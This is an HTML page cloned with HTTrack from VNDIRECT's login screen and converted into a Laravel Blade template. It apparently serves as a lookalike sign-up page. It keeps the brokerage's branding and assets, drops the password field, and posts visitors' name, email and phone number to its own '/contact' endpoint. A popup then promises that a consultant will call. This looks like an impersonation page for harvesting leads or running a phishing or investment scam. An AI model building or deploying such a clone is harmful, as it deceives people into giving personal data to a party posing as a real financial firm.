
<!DOCTYPE html>
<html lang="vi">

<!-- Mirrored from id.vndirect.com.vn/login?httpReferer=https%3A%2F%2Fmyaccount.vndirect.com.vn%2Fauth?response=%2F by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Jan 2022 12:55:38 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <title>VNDIRECT - Đăng nhập</title>
    <meta name="description" content="#">
    <meta name="keywords" content="#">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <link rel="icon" href="{{ asset('/static-03.vndirect.com.vn/id/1.0.0/resources/images/favicon.png')}}" type="image/x-icon">
    <link rel="shortcut icon" href="{{ asset('/static-03.vndirect.com.vn/id/1.0.0/resources/images/favicon.png')}}" type="image/x-icon">
    
        <link rel="stylesheet" href="{{ asset('/static-03.vndirect.com.vn/id/1.0.0/resources/plugins/css/bootstrap.min.css')}}"/>
    
        <link rel="stylesheet" href="{{ asset('/static-03.vndirect.com.vn/id/1.0.0/resources/plugins/font-awesome-4.7.0/css/font-awesome.min.css')}}"/>
    
        <link rel="stylesheet" href="{{ asset('/static-03.vndirect.com.vn/id/1.0.0/resources/plugins/css/datepicker.min.css')}}"/>
    
        <link rel="stylesheet" href="{{ asset('/static-03.vndirect.com.vn/id/1.0.0/resources/plugins/rangeslider.js-2.3.0/rangeslider.css')}}"/>
    
        <link rel="stylesheet" href="{{ asset('/static-03.vndirect.com.vn/id/1.0.0/resources/plugins/css/selectize.default.min.css')}}"/>
    
        <link rel="stylesheet" href="{{ asset('/static-03.vndirect.com.vn/id/1.0.0/resources/css/style.css')}}"/>
    
        <link rel="stylesheet" href="{{ asset('/static-03.vndirect.com.vn/id/1.0.0/resources/css/login.css')}}"/>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
        window.vnda = window.vnda || function () {
            (vnda.q = vnda.q || []).push(arguments)
        };
        vnda.l = +new Date;
    </script>
    <!-- End Vndirect Analytics -->
</head>
<body>

<div class="container-site">
    


<!DOCTYPE html>
<html lang="vi">
<head>
    <script type="text/javascript">
        var httpReferer = "index.html";
        var defaultRedirectUrl = "/contact";
        var vndaName = "vnd-id-app";
        var vndaTrackerName = "vnd-id-app-tracker";
    </script>
</head>
<body>
<div>
    <input type="hidden" id="url" value="/contactauth?response=/"/>

    <div class="login-main-wrapper d-flex justify-content-center">
        <img src="{{ asset('/static-03.vndirect.com.vn/id/1.0.0/resources/images/login/login-background.png')}}"
             class="login-background"
             alt="background"
        >
        <div class="login-main align-self-center">
            <div class="login-form-wrapper d-flex flex-row">
                <div class="position-relative">
                    <img src="{{ asset('/static-03.vndirect.com.vn/id/1.0.0/resources/images/login/login-form-left.png')}}"
                    >
                    <div class="position-absolute w-100 text-center"
                         style="top: 70px;">
                        <img src="{{ asset('/static-03.vndirect.com.vn/id/1.0.0/resources/images/login/login-vnd-logo.png')}}"
                        >
                    </div>
                </div>

                <div class="login-form-main">
                    <form autocomplete="off" action="{{ url('contact') }}" method="POST" role="form" id="contact">
                        {{ csrf_field()}}
                        <div class="d-md-none mb-3 text-center">
                            <a href="index.html">
                                <img src="{{ asset('/static-03.vndirect.com.vn/id/1.0.0/resources/images/vndid-logo.png')}}" alt="vnd-logo" height="42">
                            </a>
                        </div>
                        <div class="text-center mt-3">
                            <input id="login-error" type="hidden">
                        </div>

                        <div class="form-group mt-3 mt-md-4 ml-md-4 mr-md-4">
                            <div class="input-group">
                                <span class="input-group-append">
                                    <div class="input-group-text" id="icon-username">
                                        <i class="fa fa-user"></i>
                                    </div>
                                </span>
                                <input id="username" type="text" autocomplete="off" autofocus name="username"
                                       autocapitalize="none"
                                       class="form-control" placeholder="Tên đăng nhập">
                            </div>
                            <span id="username-error" class="error" style="display:none">Tên không được bỏ trống</span>
                        </div>

						<div class="form-group mt-3 mt-md-4 ml-md-4 mr-md-4">
                            <div class="input-group">
                                <span class="input-group-append">
                                    <div class="input-group-text" id="icon-username">
                                        <i class="fa fa-user"></i>
                                    </div>
                                </span>
                                <input id="email" type="text" autocomplete="off" autofocus
                                       autocapitalize="none"
                                       name="email"
                                       class="form-control" placeholder="Email">
                            </div>
                            <span id="email-error" class="error" style="display:none">Email không đúng định dạng</span>

                        </div>

                        <div class="form-group mt-3 mt-md-4 ml-md-4 mr-md-4">
                            <div class="input-group">
                                <span class="input-group-append">
                                    <div class="input-group-text" id="icon-username">
                                        <i class="fa fa-user"></i>
                                    </div>
                                </span>
                                <input id="phone" type="text" autocomplete="off" autofocus
                                       autocapitalize="none"
                                       name="phone"
                                       class="form-control" placeholder="Số điện thoại">
                            </div>
                            <span id="phone-error" class="error" style="display:none">Số điện thoại không đúng định dạng</span>

                        </div>

                        <div class="login-btn-wrap">
                            <div align="center">
                                <button type="button" class="btn btn-register-account" id="btn-register" value="https://accounts.vndirect.com.vn/">
                                    <i class="fa fa-unlock"></i>
                                    MỞ TÀI KHOẢN
                                </button>
                            </div>
                            <div class="text-center">
                                <a href="/" id="forgetPassword" class="vnd-color-orange-hover color-inherit">Liên hệ với chúng tôi</a>
                                <span>|</span>
                                <a href="/" target="_blank"
                                   class="vnd-color-orange-hover color-inherit">Trợ
                                    giúp</a>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
<script>
$("#btn-register" ).click(async function( event ) {
    event.preventDefault();
    const email = $("#email").val();
    const username = $("#username").val();
    const phone = $("#phone").val();
    const validateEmail = await String(email)
        .toLowerCase()
        .match(
        /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
    );
    const validatePhone = await String(phone)
        .toLowerCase()
        .match(
        /(84|0[3|5|7|8|9])+([0-9]{8})\b/g
    );
    if (username.length < 1) {
        $("#username-error").show();
        $("#username").focus();
    } else {
        $("#username-error").hide();
    }

    if (email.length >= 1 && validateEmail === null) {
        $("#email-error").show();
        $("#email-error").text("Email không đúng định dạng");
        $("#email").focus();
    } else if (email.length < 1) {
        $("#email-error").show();
        $("#email-error").text("Email không được bỏ trống");
        $("#email").focus();
    } else {
        $("#email-error").hide();
    }
    if (phone.length >= 1 && validatePhone === null) {
        $("#phone-error").show();
        $("#phone-error").text("Số điện thoại không đúng định dạng");
        $("#phone").focus();
    } else if (phone.length < 1) {
        $("#phone-error").show();
        $("#phone-error").text("Số điện thoại không được bỏ trống");
        $("#phone").focus();
    } else {
        $("#phone-error").hide();
    }
    if (username.length >= 1 && validateEmail !== null && validatePhone !== null) {
        $.ajax({
            url: "/contact",
            type: "POST",
            data: {
                email: email,
                username: username,
                phone: phone,
                _token: "{{csrf_token()}}"
            },
            success: function (data) {
                if (data) {
                    const { value: accept } = Swal.fire({
                        title: 'Đăng ký thành công',
                        text: 'Vui lòng đợi trong giây lát, nhân viên tư vấn sẽ liên hệ với bạn.',
                        icon: 'success',
                        confirmButtonText: 'Về trang chủ'
                    }).then((result) => {
                        if (result['isConfirmed']){
                            console.log('home')
                            window.location.href = "/";
                        }
                    });
                }
            }
        });
    }
});
</script>
</body>
</div>

<div id="vndLoader" class="vnd-loader bg-change d-none">
    <div class="vnd-align-center">
        <i class="fa fa-refresh" aria-hidden="true"></i> Loading...
    </div>
</div>
<style>
    .error {
        color : rgb(247, 148, 29);
    }
    .position-relative {
        display: none;
    }
</style>
</body>
</html>
<script type='text/javascript' src="/static-01.vndirect.com.vn/cms02/wp-content/themes/vndirect/js/facebook.js"></script>
<style>
#header .list-inline.check_api_div {
    letter-spacing:normal;
    font-weight:900;
}
</style>